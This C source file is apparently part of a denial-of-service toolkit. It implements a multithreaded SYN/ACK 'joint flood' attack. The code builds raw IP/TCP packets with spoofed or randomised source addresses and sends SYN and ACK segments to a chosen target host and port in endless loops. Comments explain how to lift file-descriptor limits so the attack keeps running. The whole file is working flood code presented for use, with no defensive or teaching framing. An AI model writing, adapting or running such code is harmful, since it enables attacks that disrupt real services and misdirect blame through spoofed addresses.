#include <stdio.h>  // memset
#include <string.h> // strlen
#include <stdlib.h> // exit
#include <errno.h>  // errno
#include <stdarg.h> // va_list
#include <pthread.h>

#include <unistd.h> // close
#include <sys/socket.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <arpa/inet.h>

#include "../main.h"

extern void info(const char *fmt, ...);
extern void warning(const char *fmt, ...);
extern void error(const char *fmt, ...);

extern char *randip(char **buff);
extern int randport(void);
extern unsigned short checksum(unsigned short *ptr, int hlen);

static int _send_syn_packet(const char *daddr, const int dport, const char *saddr, const int sport, const int rep)
{
    int socket_fd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP); // create a raw socket
    if (socket_fd < 0)
    {
        /*
        * if errno == 1
        *   This program should run as root user
        * if errno == 24
        *   You shoud check max file number use 'ulimit -n' in linux
        *   And change the max file number use 'ulimit -n <setting number>'
        *   Or you can change the EACH_IP_REPEAT_TIME value to delay the attack end time
        */
        error(strerror(errno));
    }
    char datagram[4096] = {'\0'};

    struct ip *iph = (struct ip *)datagram;
    struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof(struct ip));

    /* for sendto user */
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(dport);
    sin.sin_addr.s_addr = inet_addr(daddr);

    iph->ip_v = 4;
    iph->ip_hl = 5; // header length
    iph->ip_tos = 0;
    iph->ip_len = sizeof(struct ip) + sizeof(struct tcphdr);
    iph->ip_id = htons(randport()); // unsigned 16 bits from 0 to 65535
    iph->ip_off = 0;
    iph->ip_ttl = 255;
    iph->ip_p = IPPROTO_TCP;
    iph->ip_sum = 0;                       // set to 0 before calculating checksum
    iph->ip_src.s_addr = inet_addr(saddr); // spoof the source ip address
    iph->ip_dst.s_addr = inet_addr(daddr);
    iph->ip_sum = checksum((unsigned short *)datagram, sizeof(struct ip));

    tcph->source = htons(sport);
    tcph->dest = htons(dport);
    tcph->seq = 0;
    tcph->ack_seq = 0;
    tcph->doff = 5; // TCP header length is 20 Bytes
    tcph->fin = 0;
    tcph->syn = 1;
    tcph->rst = 0;
    tcph->psh = 0;
    tcph->ack = 0;
    tcph->urg = 0;
    tcph->window = htons(65535); // maximum allowed window size
    tcph->check = 0;
    /*
     * if you set a checksum to zero, your kernel's IP stack
     * should fill in the correct checksum during transmission.
     */
    tcph->urg_ptr = 0;

    // IP_HDRINCL to tell the kernel that headers are included in the packet
    int one = 1;
    const int *val = &one;
    if (setsockopt(socket_fd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
    {
        error("Error setting IP_HDRINCL: %s(%d)", strerror(errno), errno);
    }

    int flag = 1;
    int len = sizeof(int);
    if (setsockopt(socket_fd, SOL_SOCKET, SO_REUSEADDR, &flag, len) < 0)
    {
        error("Error setting SO_REUSEADDR: %s(%d)", strerror(errno), errno);
    }
    // send the packet
    for (int i = 0; i < rep; i++)
    {
        if (sendto(socket_fd, datagram, iph->ip_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
        {
            error(strerror(errno));
        }
    }
    close(socket_fd);

    return 0;
}

static int _send_ack_packet(const char *daddr, const int dport, const char *saddr, const int sport, const int rep)
{
    int socket_fd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP); // create a raw socket
    if (socket_fd < 0)
    {
        /*
        * if errno == 1
        *   This program should run as root user
        * if errno == 24
        *   You shoud check max file number use 'ulimit -n' in linux
        *   And change the max file number use 'ulimit -n <setting number>'
        *   Or you can change the EACH_IP_REPEAT_TIME value to delay the attack end time
        */
        error(strerror(errno));
    }
    char datagram[4096] = {'\0'}; // datagram to represent the packet

    struct ip *iph = (struct ip *)datagram;                                // IP header
    struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof(struct ip)); // TCP header

    /* for sendto user */
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(dport);
    sin.sin_addr.s_addr = inet_addr(daddr);

    iph->ip_v = 4;
    iph->ip_hl = 5; // header length
    iph->ip_tos = 0;
    iph->ip_len = sizeof(struct ip) + sizeof(struct tcphdr);
    iph->ip_id = htons(randport()); // unsigned 16 bits from 0 to 65535
    iph->ip_off = 0;
    iph->ip_ttl = 255;
    iph->ip_p = IPPROTO_TCP;
    iph->ip_sum = 0;                       // set to 0 before calculating checksum
    iph->ip_src.s_addr = inet_addr(saddr); // spoof the source ip address
    iph->ip_dst.s_addr = inet_addr(daddr);
    iph->ip_sum = checksum((unsigned short *)datagram, sizeof(struct ip));

    tcph->source = htons(sport);
    tcph->dest = htons(dport);
    tcph->seq = 0;
    tcph->ack_seq = htons(randport());
    tcph->doff = 5;
    tcph->fin = 0;
    tcph->syn = 0;
    tcph->rst = 0;
    tcph->psh = 0;
    tcph->ack = 1; // magic
    tcph->urg = 0;
    tcph->window = htons(65535); // maximum allowed window size
    tcph->check = 0;
    /*
     * if you set a checksum to zero, your kernel's IP stack
     * should fill in the correct checksum during transmission.
     */
    tcph->urg_ptr = 0;

    // IP_HDRINCL to tell the kernel that headers are included in the packet
    int one = 1;
    const int *val = &one;
    if (setsockopt(socket_fd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
    {
        error("Error setting IP_HDRINCL: %s(%d)", strerror(errno), errno);
    }

    int flag = 1;
    int len = sizeof(int);
    if (setsockopt(socket_fd, SOL_SOCKET, SO_REUSEADDR, &flag, len) < 0)
    {
        error("Error setting SO_REUSEADDR: %s(%d)", strerror(errno), errno);
    }
    // send the packet
    for (int i = 0; i < rep; i++)
    {
        if (sendto(socket_fd, datagram, iph->ip_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
        {
            error(strerror(errno));
        }
    }
    close(socket_fd);

    return 0;
}

static void _attack_thread(pSFTP parameters)
{
    char *daddr = parameters->daddr;
    int dport = parameters->dport;
    // int rep = parameters->rep;
    /*
     * every ip's repeat times be small
     */

    if (parameters->random_saddr)
    {
        char *saddr = (char *)malloc(sizeof(char) * MAX_IP_LENGTH);
        int sport;
        while (1)
        {
            saddr = randip(&saddr);
            sport = randport();
            _send_syn_packet(daddr, dport, saddr, sport, 4);
            _send_ack_packet(daddr, dport, saddr, sport, 4);
        }
        free(saddr);
    }
    else
    {
        char *saddr = parameters->saddr;
        int sport = parameters->sport;
        while (1)
        {
            _send_syn_packet(daddr, dport, saddr, sport, 4);
            _send_ack_packet(daddr, dport, saddr, sport, 4);
        }
    }
}

int syn_ack_joint_flood_attack(char *url, int port, ...)
{
    /*
     * parameters:
     * 0 - url
     * 1 - port
     * 2 - random source address label (int)
     * 3 - random source address repetition time (int)
     * 4 - thread number (int)
     * 5 - source ip address (char *)
     * 6 - source port (int)
     */

    int slist[4] = {'\0'};
    int i;

    va_list vlist;
    va_start(vlist, port);
    for (i = 0; i < 3; i++)
    {
        slist[i] = va_arg(vlist, int);
    }
    int random_saddr = slist[0];
    int rep = slist[1];
    int thread_number = slist[2];
    char *saddr = va_arg(vlist, char *);
    int sport = va_arg(vlist, int);
    va_end(vlist);

    pSFTP parameters = (pSFTP)malloc(sizeof(SFTP));
    parameters->daddr = url;
    parameters->dport = port;
    parameters->random_saddr = random_saddr;
    parameters->rep = rep;
    parameters->saddr = saddr;
    parameters->sport = sport;

    pthread_t tid_list[thread_number];
    pthread_attr_t attr;
    int ret;

    if (strlen(url))
    {
        if (strstr(url, "http"))
        {
            error("ack flood attack target's address should not include 'http' or 'https'");
        }
    }
    if (port == 0)
    {
        error("please specify a target port");
    }

    for (i = 0; i < thread_number; i++) // only one process
    {
        if (pthread_attr_init(&attr))
        {
            error(strerror(errno));
        }
        // if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED))
        if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_JOINABLE))
        {
            error(strerror(errno));
        }
        // create thread
        ret = pthread_create(&tid_list[i], &attr, (void *)_attack_thread, parameters);
        if (ret != 0)
        {
            error("create pthread failed, ret: %d, %s", ret, strerror(errno));
        }
        pthread_attr_destroy(&attr);
    }
    // pthread_detach(tid);
    // join them all
    for (i = 0; i < thread_number; i++)
    {
        pthread_join(tid_list[i], NULL);
    }

    return 0;
}
